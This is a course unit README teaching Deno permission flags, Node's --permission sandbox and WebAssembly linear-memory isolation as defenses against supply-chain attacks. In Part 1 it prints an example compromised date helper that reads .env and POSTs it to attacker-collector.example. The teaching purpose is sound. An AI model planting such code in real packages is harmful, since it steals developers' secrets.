# Unit 17: Deno Security Sandboxes, Node `--permission` & WebAssembly Bytecode

**AZ CTE Standards:** `1.3, 1.4, 4.0, 11.6–11.8, 13.1`  
**Capstone Target:** [`projects/unit-project.md`](./projects/unit-project.md) · **Setup Checklist:** [`setup-guide.md`](./setup-guide.md) · **50-Q Mastery Exam:** [`quizzes/unit-test-50.md`](./quizzes/unit-test-50.md)

---

## Why I Stopped Blindly Running `npm install` (And Why Sandboxes Finally Matter)

Early in every JavaScript developer's career, someone tells you to run `npm install awesome-date-formatter` and `node index.js`, and it feels like magic. Everything works in three seconds—until you stop and think about what actually just happened inside your operating system.

When you run `node index.js` with default settings, Node.js hands your script **ambient authority**. Every single line of JavaScript in your codebase—plus **every transitive dependency buried five folders deep inside `node_modules/`**—inherits your full user privileges. A compromised utility package (`event-stream` in 2018, or a malicious `postinstall` script) does not need root access or a kernel zero-day. It just calls `fs.readFileSync(process.env.HOME + '/.ssh/id_rsa')` or reads `process.env.AWS_SECRET_ACCESS_KEY` and ships it out over `fetch()`.

Here is the unvarnished truth behind the runtime wars: **Deno did not get interesting because it dropped `node_modules`—it got interesting because it flipped the security default from "trust everything" to "deny everything unless explicitly permitted."** And even better? Node.js finally took the hint and built `--permission` capability flags directly into modern Node (`v20+` and `v24 LTS`), while **WebAssembly (`.wasm`)** gave us a mathematically verifiable, capability-isolated bytecode sandbox for untrusted logic and heavy math.

In this unit, we cut through the runtime hype and build both halves hands-on—**100% offline in Node 24**, with optional native **Deno** and **`wat2wasm` / `wasm-pack`** parity.

---

## Navigation Hub: Lessons, Labs & Assessments

1. [**Lesson 17.1: Deno Security Sandbox & Capability Runtimes**](./01-Deno-Secure-Runtime/readme.md) — Explicit `--allow-*` / `--deny-*` capability flags, URL & `jsr:` imports, native TypeScript execution, `Deno.serve` Web Standards, and Node `--permission` (`ERR_ACCESS_DENIED`).
   - Slides: [`slides.md`](./01-Deno-Secure-Runtime/slides/slides.md) · Student Lesson: [`student-lesson.md`](./01-Deno-Secure-Runtime/student-lesson.md)
   - Reference Code: [`deno_server.ts`](./01-Deno-Secure-Runtime/code/deno_server.ts) · [`deno.json`](./01-Deno-Secure-Runtime/code/deno.json) · [`permissionPolicy.mjs`](./01-Deno-Secure-Runtime/code/permissionPolicy.mjs) · [`runtimePermissionLab.test.mjs`](./01-Deno-Secure-Runtime/code/runtimePermissionLab.test.mjs)
2. [**Lesson 17.2: WebAssembly (WASM) Binary Architecture & Linear Memory**](./02-WebAssembly-WASM/readme.md) — The 8-byte `\0asm` binary preamble, LEB128 sections (`Type`, `Function`, `Memory`, `Export`, `Code`), WAT S-expressions, `WebAssembly.instantiate()`, shared `WebAssembly.Memory` (`64 KiB` pages), out-of-bounds sandbox traps, and `wat2wasm` / `wasm-pack`.
   - Slides: [`slides.md`](./02-WebAssembly-WASM/slides/slides.md) · Student Lesson: [`student-lesson.md`](./02-WebAssembly-WASM/student-lesson.md)
   - Reference Code: [`wasmBinaryBuilder.mjs`](./02-WebAssembly-WASM/code/wasmBinaryBuilder.mjs) · [`wasmBinaryBuilderDemo.test.mjs`](./02-WebAssembly-WASM/code/wasmBinaryBuilderDemo.test.mjs)
- **Setup & CLI Verification:** [`setup-guide.md`](./setup-guide.md)
- **Curriculum Guide & SMART Goals:** [`unit-guide.md`](./unit-guide.md)
- **Evaluations:** [`evaluations/pre-unit-eval.md`](./evaluations/pre-unit-eval.md) | [`evaluations/post-unit-eval.md`](./evaluations/post-unit-eval.md) | [`evaluations/eval-answer-key.md`](./evaluations/eval-answer-key.md)
- **Formative Quizzes:** [`quizzes/quiz-1-concepts.md`](./quizzes/quiz-1-concepts.md) | [`quizzes/quiz-2-application.md`](./quizzes/quiz-2-application.md)
- **50-Question Unit Mastery Exam:** [`quizzes/unit-test-50.md`](./quizzes/unit-test-50.md)
- **Unit Project:** [`projects/unit-project.md`](./projects/unit-project.md) · Rubric: [`projects/project-rubric.md`](./projects/project-rubric.md) · Starter: [`../0-student_files/projects/unit-17-deno-wasm-audit/`](../0-student_files/projects/unit-17-deno-wasm-audit/)
- **Automated Grader:** `npm run grade -- --unit 17`

---

## Part 1: Ambient Authority vs. Capability-Based Sandboxing

### How Traditional Node Fails Under Supply-Chain Attack

Imagine installing a CSV formatting dependency whose latest patch version slipped past a maintainer's compromised npm token. Because classic `node app.js` grants **ambient authority**, that formatter shares 100% of your app's filesystem, network, and environment permissions:

```javascript
// Innocent-looking helper you imported for date formatting:
import fs from 'node:fs';

export function formatDate(date) {
  // Nobody checks what runs inside node_modules unless the runtime stops it!
  const stolen = fs.existsSync('.env') ? fs.readFileSync('.env', 'utf8') : '';
  if (stolen) {
    fetch('https://attacker-collector.example/drop', { method: 'POST', body: stolen }).catch(() => {});
  }
  return new Date(date).toISOString();
}
```

### How Deno's Capability Flags Draw Hard Borders

When Ryan Dahl launched Deno, the core design principle was **Zero Trust by default**. A Deno process has **zero** filesystem, network, environment, or subprocess capabilities until you grant them explicitly on the CLI:

| Capability | Scoped Deno Flag (Good) | Explicit Deny Carve-Out | Node 24 `--permission` Equivalent | Wildcard Anti-Pattern (Never Ship!) |
|---|---|---|---|---|
| **Read Files** | `--allow-read=./public` | `--deny-read=./public/.env` | `--permission --allow-fs-read=./public` | `-A` / `--allow-all` / `--allow-read` / `--allow-fs-read=*` |
| **Write Files** | `--allow-write=./logs` | `--deny-write=/etc` | `--permission --allow-fs-write=./logs` | `--allow-write` / `--allow-fs-write=*` |
| **Network I/O** | `--allow-net=127.0.0.1:8080` | `--deny-net=169.254.169.254` | *(OS/proxy/policy guardrail)* | `--allow-net` *(unrestricted egress)* |
| **Env Secrets** | `--allow-env=PORT,APP_ENV` | `--deny-env=AWS_SECRET_ACCESS_KEY` | *(Clean spawn `env`)* | `--allow-env` *(leaks every token)* |
| **Subprocesses** | `--allow-run=git` | `--deny-run` | `--allow-child-process` | `--allow-run` *(shell RCE surface)* |

Two practical rules make or break real production configs:

1. **Why `-A` (`--allow-all`) completely defeats the point:** Passing `deno run -A server.ts` turns Deno right back into unsandboxed ambient authority. You kept the strict runtime syntax and threw away the security boundary. Always scope paths (`./public`) and exact host:port targets (`127.0.0.1:8080`).
2. **`--deny-*` wins over broader `--allow-*`:** If your app needs `./public/` for static assets, explicitly add `--deny-read=./public/.env` (or check deny lists *before* allow roots in policy engines like [`permissionPolicy.mjs`](./01-Deno-Secure-Runtime/code/permissionPolicy.mjs)).

### Native TypeScript, `jsr:` Imports & `deno.json`

Deno also eliminates the Babel/webpack/tsconfig boilerplate tax for backend utilities:
- Running `deno run deno_server.ts` executes TypeScript natively; `deno check deno_server.ts` validates strict static types.
- Instead of `node_modules/` resolution surprises, Deno uses standard ESM URLs and the **JavaScript Registry (`jsr:`)** mapped cleanly inside [`deno.json`](./01-Deno-Secure-Runtime/code/deno.json):

```json
{
  "tasks": {
    "start": "deno run --allow-net=127.0.0.1:8080 --allow-env=PORT,APP_ENV deno_server.ts"
  },
  "imports": {
    "@std/path": "jsr:@std/path@^1.0.8"
  }
}
```

- Web standards (`Request`, `Response`, `URL`, `fetch`, `crypto.subtle`) power `Deno.serve({ hostname: '127.0.0.1', port }, handleRequest)` so skills transfer straight to Cloudflare Workers, Bun, and modern browsers.

### Node 24's Built-In `--permission` Parity

You do not need Deno installed to prove capability sandboxing on your laptop today. Node 24 LTS ships `--permission` natively:

```bash
# Try reading a disallowed path under Node's permission sandbox:
node --permission --allow-fs-read=./package.json -e "
  import('node:fs').then(fs => console.log(fs.readFileSync('/etc/hosts', 'utf8')));
"
```

Node throws `ERR_ACCESS_DENIED` synchronously—no external library, no Docker container required.

> **Try this right now**  
> Run Lesson 17.1's live subprocess sandbox verification suite:
> ```bash
> node --test 17-Deno-Security-and-WebAssembly/01-Deno-Secure-Runtime/code/runtimePermissionLab.test.mjs
> ```
> Inspect how [`runtimePermissionLab.test.mjs`](./01-Deno-Secure-Runtime/code/runtimePermissionLab.test.mjs) spawns child Node processes with `--permission` and captures real `ERR_ACCESS_DENIED` traps across filesystem reads, writes, and `child_process` calls.

---

## Part 2: WebAssembly (`.wasm`) — Portable Bytecode & Linear Memory Security

Runtime flags protect your OS from JavaScript dependencies. **WebAssembly (WASM)** goes one layer deeper: what if you need to run **untrusted third-party compute plugins** (image filters, custom pricing formulas, compression codecs) at near-native speed inside JS *without* trusting them with your JS heap or OS?

### Reading the Raw `.wasm` Binary Header (No Magic, Just Bytes)

Every valid `.wasm` file—whether compiled from Rust, C++, Zig, AssemblyScript, or hand-assembled in JS—starts with an **8-byte preamble**:

```text
Offset:  00   01   02   03   | 04   05   06   07
Hex:     0x00 0x61 0x73 0x6d | 0x01 0x00 0x00 0x00
Meaning:  \0    a    s    m  | Version 1 (Little-Endian UInt32)
```

Right after those 8 bytes come numbered **binary sections** encoded in ascending numeric order with **LEB128** variable-length integers:

| Section ID | Section Name | What It Stores |
|---|---|---|
| **`1`** | **Type** | Parameter & return signatures (e.g., `(i32, i32) -> i32`, marker `0x60`) |
| **`3`** | **Function** | Maps each internal function index to its Type index |
| **`5`** | **Memory** | Declares linear memory bounds in **`64 KiB` pages** (`1 page = 65,536 bytes`) |
| **`7`** | **Export** | Names & kinds (`0x00` func, `0x02` memory) exposed to the JS host |
| **`10`** | **Code** | Local variable counts + stack-machine bytecode ending with `0x0b` (`end`) |

### WAT S-Expressions: Assembly Language for the Web Stack Machine

WebAssembly has a human-readable companion format called **WAT (WebAssembly Text)** written as Lisp-style S-expressions. Notice how stack-based execution works—push parameters onto the stack, then run an instruction that pops them and leaves the result:

```wat
(module
  (memory (export "memory") 1 4)
  (func (export "add") (param $a i32) (param $b i32) (result i32)
    local.get $a
    local.get $b
    i32.add)
)
```

Compile `.wat` to `.wasm` via `wat2wasm add.wat -o add.wasm`, or compile Rust crates via `wasm-pack build --target nodejs --release`. In this unit, [`wasmBinaryBuilder.mjs`](./02-WebAssembly-WASM/code/wasmBinaryBuilder.mjs) emits valid bytecode straight from pure JavaScript `Uint8Array` so every test runs **100% offline** with zero C++/Rust compiler setup required.

### `WebAssembly.Memory` & Why Bounds Traps Beat Heap Leaks

JavaScript cannot pass JS objects directly inside raw WASM integers—and WASM cannot reach out and read JS variables in your V8 heap! Instead, both sides share one contiguous `ArrayBuffer` exported as `instance.exports.memory`:

```javascript
import { buildToolkitWasmBytes } from './17-Deno-Security-and-WebAssembly/02-WebAssembly-WASM/code/wasmBinaryBuilder.mjs';

const bytes = buildToolkitWasmBytes();
console.log('Valid WASM binary?', WebAssembly.validate(bytes)); // true

const { instance } = await WebAssembly.instantiate(bytes, {});
const view = new Uint8Array(instance.exports.memory.buffer); // 65,536 bytes (1 page)

const payload = new TextEncoder().encode('AZ-CTE');
view.set(payload, 128);
console.log('ASCII byte checksum:', instance.exports.sumBytes(128, payload.length));

// Reversible in-place XOR transform inside WASM linear memory:
instance.exports.xorTransform(128, payload.length, 0x42);
instance.exports.xorTransform(128, payload.length, 0x42);
console.log('Recovered UTF-8:', new TextDecoder().decode(view.slice(128, 128 + payload.length)));
```

Look at the two security guarantees working together:
1. **Zero Ambient OS Syscalls:** Unless your JS host deliberately injects a function into `WebAssembly.instantiate(bytes, importsObj)`, a `.wasm` binary literally has **no API** to open files, touch sockets, read env vars, or spawn processes.
2. **Bounds-Checked Linear Memory (`WebAssembly.RuntimeError`):** Ask `sumBytes()` to read at byte offset `70000` inside a 1-page (`65,536`-byte) linear buffer and WASM traps immediately with `WebAssembly.RuntimeError: memory access out of bounds` instead of reading adjacent host RAM.

> **Try this right now**  
> Run Lesson 17.2's binary emitter, linear memory trap verification, and WASM vs. JS Fibonacci benchmark:
> ```bash
> node --test 17-Deno-Security-and-WebAssembly/02-WebAssembly-WASM/code/wasmBinaryBuilderDemo.test.mjs
> ```
> Then check your Unit 17 student TDD lab progress:
> ```bash
> npm run grade -- --unit 17
> ```

---

## Part 3: Defense-in-Depth — Combining Capability Flags, Introspection & WASM

So when do you reach for **Deno / Node `--permission`** vs. **WebAssembly**, and why do senior engineers often pair them together?

Think about an enterprise platform that accepts third-party pricing extensions or Markdown transforms:

1. **Outer Sandbox (Runtime Capability Flags):** Run the Node/Deno service with `--permission --allow-fs-read=./public` (or Deno `--allow-net=127.0.0.1:8080 --deny-read=./public/.env`). Even if an npm utility in your own HTTP glue code gets compromised tomorrow, it cannot dump `/etc/passwd`, open outbound sockets to exfiltrate customer keys, or spawn `bash`.
2. **Graceful Runtime Introspection (`Deno.permissions.query`):** Instead of crashing mid-request with an unhandled exception, well-engineered Deno services check whether optional permissions exist first—just like [`deno_server.ts`](./01-Deno-Secure-Runtime/code/deno_server.ts) does:
   ```ts
   const readPerm = await Deno.permissions.query({ name: 'read', path: './deno.json' });
   if (readPerm.state !== 'granted') {
     return Response.json({ error: 'PermissionDenied' }, { status: 403 });
   }
   ```
3. **Inner Sandbox (WebAssembly with `{}` Imports):** Execute untrusted plugin math inside `WebAssembly.instantiate(pluginBytes, {})`. Because `importsObj` is empty, the plugin gets zero access to JS closures, `process.env`, HTTP `fetch()`, or OS handles—only bounded integers inside a `64 KiB` linear memory buffer.
4. **Pure JS Where JS Wins:** Keep I/O-bound database routing, small JSON validation, and DOM orchestration in TypeScript/JavaScript where V8/JSC already shine, reserving `wat2wasm` / `wasm-pack` (Rust) for sustained compute loops or zero-trust plugin boundaries.

> **Try this right now**  
> Verify Node 24's capability sandbox directly from your terminal—watch `./package.json` succeed while `/etc/hosts` triggers `ERR_ACCESS_DENIED`:
> ```bash
> node --permission --allow-fs-read=./package.json -e "
>   import('node:fs').then(fs => {
>     console.log('Allowed:', JSON.parse(fs.readFileSync('./package.json', 'utf8')).name);
>     try { fs.readFileSync('/etc/hosts', 'utf8'); } catch (e) { console.log('Blocked:', e.code); }
>   });
> "
> ```

---

## Core Terminology Reference

| Term | Plain-English Definition | Unit 17 Context |
|---|---|---|
| **Ambient Authority** | Implicit full OS privileges inherited by all imported code | Default `node script.js` behavior without `--permission` |
| **Capability Security** | Code receives only explicitly passed/allowed tokens & scopes | Deno `--allow-*` flags and Node `--permission` |
| **Least Privilege** | Granting the narrowest path/host/env scope needed to work | Scoping `--allow-read=./public --deny-read=./public/.env` |
| **`jsr:` Registry** | ESM-first TypeScript/JS package registry designed for modern runtimes | Mapped in [`deno.json`](./01-Deno-Secure-Runtime/code/deno.json) (`jsr:@std/path`) |
| **`\0asm` Magic Header** | 4 bytes (`0x00 0x61 0x73 0x6d`) starting every `.wasm` binary | Followed by 4-byte little-endian version `1` |
| **LEB128** | Little-Endian Base-128 variable-length integer encoding | Encodes WASM section lengths and bytecode immediates |
| **WAT** | WebAssembly Text S-expression source syntax | Compiled to `.wasm` via `wat2wasm` (`WABT`) |
| **Linear Memory Page** | Fixed **`64 KiB` (`65,536` bytes)** allocation unit for `WebAssembly.Memory` | Shared `ArrayBuffer` accessed by `Uint8Array` views |
| **Defense-in-Depth** | Layering independent security boundaries together | Running untrusted WASM (no syscalls) inside `--permission` Node/Deno |

---

## Common Error & Security Triage Table

| Symptom / Error | Root Cause | Exact Fix |
|---|---|---|
| `ERR_ACCESS_DENIED` in Node 24 | `--permission` is active without `--allow-fs-read=...` or `--allow-child-process` | Grant the minimal scoped flag (e.g. `--allow-fs-read=./public`), never `*` |
| `PermissionDenied` in Deno | Script attempted file, net, or env access without `--allow-*` | Add scoped flag like `--allow-net=127.0.0.1:8080` or prompt cleanly |
| Security audit rejects `deno run -A` | `-A` (`--allow-all`) grants unrestricted FS, net, env, and subprocess powers | Replace `-A` with exact scoped flags + `--deny-*` exclusions |
| `WebAssembly.CompileError: expected magic word 00 61 73 6d` | File is HTML/404 page, text WAT, or corrupted bytes instead of binary `.wasm` | Inspect bytes `0..7` with `inspectHeader()`; compile `.wat` via `wat2wasm` |
| `WebAssembly.RuntimeError: memory access out of bounds` | Pointer `offset + length` exceeds `memory.buffer.byteLength` (`pages * 65536`) | Validate `offset >= 0 && offset + len <= view.length` before calling WASM |
| Garbled UTF-8 after `xorTransform()` | Applied XOR once or forgot `view.slice(offset, offset + encoded.length)` | Apply `xorTransform(ptr, len, key)` a second time with the same `key` |

---

## Student Labs & Unit 17 Capstone Path (RED → GREEN TDD)

Work through the student deliverables in order and track passing assertions with `npm run grade -- --unit 17`:

1. **Lab 17.1:** [`../0-student_files/17-deno-wasm/permissionPolicyLab.mjs`](../0-student_files/17-deno-wasm/permissionPolicyLab.mjs) · Tests: [`permissionPolicyLab.test.mjs`](../0-student_files/17-deno-wasm/permissionPolicyLab.test.mjs)
2. **Lab 17.2:** [`../0-student_files/17-deno-wasm/wasmMemoryLab.mjs`](../0-student_files/17-deno-wasm/wasmMemoryLab.mjs) · Tests: [`wasmMemoryLab.test.mjs`](../0-student_files/17-deno-wasm/wasmMemoryLab.test.mjs)
3. **Unit 17 Project:** [`projects/unit-project.md`](./projects/unit-project.md) · Starter & Tests: [`../0-student_files/projects/unit-17-deno-wasm-audit/index.mjs`](../0-student_files/projects/unit-17-deno-wasm-audit/index.mjs) · [`index.test.mjs`](../0-student_files/projects/unit-17-deno-wasm-audit/index.test.mjs)
4. **Mastery Readiness:** Complete [`setup-guide.md`](./setup-guide.md), review [`unit-guide.md`](./unit-guide.md), and sit [`quizzes/unit-test-50.md`](./quizzes/unit-test-50.md).
